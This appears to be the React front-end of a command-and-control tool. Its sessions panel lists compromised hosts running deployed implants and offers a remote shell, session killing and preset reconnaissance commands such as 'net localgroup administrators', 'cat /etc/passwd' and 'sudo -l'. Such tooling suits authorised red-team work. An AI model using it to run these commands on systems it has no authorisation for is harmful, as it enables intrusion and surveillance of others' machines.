import { useState } from 'react'
import { useAPI, apiDelete, apiPost } from '../hooks/useAPI'
import type { Session } from '../types'
import {
  Monitor, Skull, Terminal, RefreshCw, ChevronDown, ChevronUp,
  Send, Copy, CheckCheck, Camera, List, Info, X
} from 'lucide-react'

interface Props {
  onOpenTerminal: (sessionID: string, sessionName: string) => void
}

interface QuickResult {
  sessionID: string
  command:   string
  stdout:    string
  stderr:    string
  exitCode:  number
}

// Quick commands per OS
const QUICK_CMDS_WIN = [
  { label: 'whoami',       cmd: 'cmd.exe /c whoami /all' },
  { label: 'hostname',     cmd: 'cmd.exe /c hostname' },
  { label: 'ipconfig',     cmd: 'cmd.exe /c ipconfig /all' },
  { label: 'ps list',      cmd: 'cmd.exe /c tasklist' },
  { label: 'netstat',      cmd: 'cmd.exe /c netstat -ano' },
  { label: 'systeminfo',   cmd: 'cmd.exe /c systeminfo' },
  { label: 'net users',    cmd: 'cmd.exe /c net user' },
  { label: 'net groups',   cmd: 'cmd.exe /c net localgroup administrators' },
]
const QUICK_CMDS_UNIX = [
  { label: 'whoami',   cmd: 'id' },
  { label: 'hostname', cmd: 'hostname' },
  { label: 'ifconfig', cmd: 'ip addr show' },
  { label: 'ps list',  cmd: 'ps aux' },
  { label: 'netstat',  cmd: 'ss -tulpn' },
  { label: 'uname',    cmd: 'uname -a' },
  { label: 'users',    cmd: 'cat /etc/passwd' },
  { label: 'sudo',     cmd: 'sudo -l' },
]

export default function Sessions({ onOpenTerminal }: Props) {
  const { data, loading, error, refresh } = useAPI<Session[]>('/api/sessions', 5_000)
  const [killing,     setKilling]     = useState<string | null>(null)
  const [expanded,    setExpanded]    = useState<string | null>(null)
  const [customCmd,   setCustomCmd]   = useState<Record<string, string>>({})
  const [executing,   setExecuting]   = useState<string | null>(null)
  const [results,     setResults]     = useState<QuickResult[]>([])
  const [copied,      setCopied]      = useState<string | null>(null)

  const sessions = data ?? []

  async function killSession(id: string) {
    if (!confirm('Kill this session?')) return
    setKilling(id)
    try { await apiDelete(`/api/sessions/${id}/kill`); refresh() }
    catch { } finally { setKilling(null) }
  }

  async function execute(session: Session, cmd: string) {
    const key = session.id
    setExecuting(key)
    try {
      const res = await apiPost<{ stdout: string; stderr: string; exit_code: number }>(
        `/api/sessions/${session.id}/execute`, { command: cmd }
      )
      setResults(prev => [
        { sessionID: session.id, command: cmd, stdout: res.stdout, stderr: res.stderr, exitCode: res.exit_code },
        ...prev.filter(r => r.sessionID !== session.id || r.command !== cmd).slice(0, 19),
      ])
    } catch (e) {
      setResults(prev => [{
        sessionID: session.id, command: cmd,
        stdout: '', stderr: String(e), exitCode: -1,
      }, ...prev.slice(0, 19)])
    } finally { setExecuting(null) }
  }

  function copyOutput(text: string, key: string) {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(key); setTimeout(() => setCopied(null), 2000)
    })
  }

  const sessionResults = (id: string) => results.filter(r => r.sessionID === id)

  return (
    <div className="flex flex-col gap-4 h-full">

      {/* ── Toolbar ──────────────────────────────────────────────────────── */}
      <div className="flex items-center justify-between">
        <h2 className="text-primary font-bold text-lg flex items-center gap-2">
          <Monitor size={18} /> Sessions
          <span className="text-muted text-sm font-normal">({sessions.length})</span>
        </h2>
        <button onClick={refresh}
          className="flex items-center gap-1 text-muted hover:text-text text-xs px-2 py-1 rounded border border-border">
          <RefreshCw size={12} /> Refresh
        </button>
      </div>

      {error && <div className="text-danger text-xs bg-danger/10 border border-danger/30 rounded p-2">{error}</div>}

      {loading && sessions.length === 0 ? (
        <div className="text-muted text-sm">Loading…</div>
      ) : sessions.length === 0 ? (
        <div className="flex-1 flex flex-col items-center justify-center gap-3 text-center py-12">
          <Monitor size={40} className="text-border" />
          <p className="text-muted text-sm">No active sessions.</p>
          <p className="text-muted text-xs">Deploy an implant and start a listener to receive connections.</p>
        </div>
      ) : (
        <div className="flex flex-col gap-2">
          {sessions.map(s => {
            const isWin     = s.os?.toLowerCase().includes('windows')
            const quickCmds = isWin ? QUICK_CMDS_WIN : QUICK_CMDS_UNIX
            const isExpanded = expanded === s.id
            const myResults  = sessionResults(s.id)
            const isExec     = executing === s.id

            return (
              <div key={s.id} className={`rounded-lg border transition-colors ${
                s.is_dead ? 'border-danger/30 opacity-60' : 'border-border hover:border-border/80'
              } bg-surface`}>

                {/* ── Session header row ──────────────────────────────── */}
                <div className="flex items-center gap-3 px-4 py-3">

                  {/* Status dot */}
                  <span className={`w-2 h-2 rounded-full shrink-0 ${s.is_dead ? 'bg-danger' : 'bg-primary animate-pulse'}`} />

                  {/* Identity */}
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2 flex-wrap">
                      <span className="text-primary font-bold text-sm">{s.name}</span>
                      <span className="text-muted text-[10px] font-mono">{s.id.slice(0,8)}</span>
                      <span className="text-muted text-[10px] bg-border/40 px-1.5 py-0.5 rounded">{s.os}/{s.arch}</span>
                      <span className="text-muted text-[10px] bg-border/40 px-1.5 py-0.5 rounded">{s.transport}</span>
                    </div>
                    <div className="text-muted text-[10px] mt-0.5 truncate">
                      {s.username}@{s.hostname} — {s.remote_address} — PID {s.pid}
                    </div>
                  </div>

                  {/* Actions */}
                  <div className="flex items-center gap-1 shrink-0">
                    <button onClick={() => onOpenTerminal(s.id, s.name)}
                      title="Interactive shell"
                      className="flex items-center gap-1 px-2 py-1.5 rounded text-xs text-primary bg-primary/10 hover:bg-primary/20 border border-primary/30 transition-colors">
                      <Terminal size={12} /> Shell
                    </button>
                    <button onClick={() => setExpanded(isExpanded ? null : s.id)}
                      title="Quick actions"
                      className="px-2 py-1.5 rounded text-xs text-accent bg-accent/10 hover:bg-accent/20 border border-accent/30 transition-colors flex items-center gap-1">
                      <Send size={12} /> Execute
                      {isExpanded ? <ChevronUp size={10} /> : <ChevronDown size={10} />}
                    </button>
                    <button onClick={() => killSession(s.id)} disabled={!!killing}
                      title="Kill session"
                      className="p-1.5 rounded text-danger hover:bg-danger/10 border border-transparent hover:border-danger/30 transition-colors disabled:opacity-40">
                      <Skull size={14} />
                    </button>
                  </div>
                </div>

                {/* ── Expanded: Execute panel ──────────────────────────── */}
                {isExpanded && (
                  <div className="border-t border-border/60 px-4 py-3 flex flex-col gap-3">

                    {/* Quick command buttons */}
                    <div>
                      <label className="text-[10px] text-muted uppercase tracking-widest mb-2 block">Quick Commands</label>
                      <div className="flex flex-wrap gap-1.5">
                        {quickCmds.map(q => (
                          <button key={q.label}
                            onClick={() => execute(s, q.cmd)}
                            disabled={isExec}
                            className="px-2.5 py-1 rounded text-[10px] border border-border text-muted hover:border-accent hover:text-accent transition-colors disabled:opacity-40 font-mono">
                            {q.label}
                          </button>
                        ))}
                      </div>
                    </div>

                    {/* Custom command input */}
                    <div className="flex gap-2">
                      <input
                        value={customCmd[s.id] ?? ''}
                        onChange={e => setCustomCmd(prev => ({ ...prev, [s.id]: e.target.value }))}
                        onKeyDown={e => {
                          if (e.key === 'Enter' && customCmd[s.id]?.trim()) {
                            execute(s, customCmd[s.id])
                            setCustomCmd(prev => ({ ...prev, [s.id]: '' }))
                          }
                        }}
                        placeholder={isWin ? 'cmd.exe /c <command>' : '/bin/bash -c <command>'}
                        className="flex-1 bg-bg border border-border rounded px-3 py-2 text-xs font-mono text-text placeholder-muted focus:border-primary outline-none"
                        disabled={isExec}
                      />
                      <button
                        onClick={() => {
                          if (customCmd[s.id]?.trim()) {
                            execute(s, customCmd[s.id])
                            setCustomCmd(prev => ({ ...prev, [s.id]: '' }))
                          }
                        }}
                        disabled={isExec || !customCmd[s.id]?.trim()}
                        className="px-3 py-2 rounded bg-accent/10 border border-accent/30 text-accent hover:bg-accent/20 transition-colors disabled:opacity-40">
                        {isExec ? <RefreshCw size={13} className="animate-spin" /> : <Send size={13} />}
                      </button>
                    </div>

                    {/* Results */}
                    {myResults.length > 0 && (
                      <div className="flex flex-col gap-2">
                        {myResults.map((r, i) => (
                          <div key={i} className="rounded border border-border/60 bg-bg">
                            <div className="flex items-center justify-between px-3 py-1.5 border-b border-border/40">
                              <span className="text-[10px] text-accent font-mono truncate flex-1">{r.command}</span>
                              <div className="flex items-center gap-1.5 shrink-0">
                                <span className={`text-[10px] px-1.5 rounded ${r.exitCode === 0 ? 'text-primary bg-primary/10' : 'text-danger bg-danger/10'}`}>
                                  exit {r.exitCode}
                                </span>
                                <button onClick={() => copyOutput(r.stdout || r.stderr, `${s.id}-${i}`)}
                                  className="text-muted hover:text-primary">
                                  {copied === `${s.id}-${i}` ? <CheckCheck size={10} className="text-primary" /> : <Copy size={10} />}
                                </button>
                              </div>
                            </div>
                            <pre className="px-3 py-2 text-[11px] font-mono text-text overflow-x-auto max-h-48 whitespace-pre-wrap break-all">
                              {r.stdout || r.stderr || '(no output)'}
                            </pre>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                )}
              </div>
            )
          })}
        </div>
      )}
    </div>
  )
}
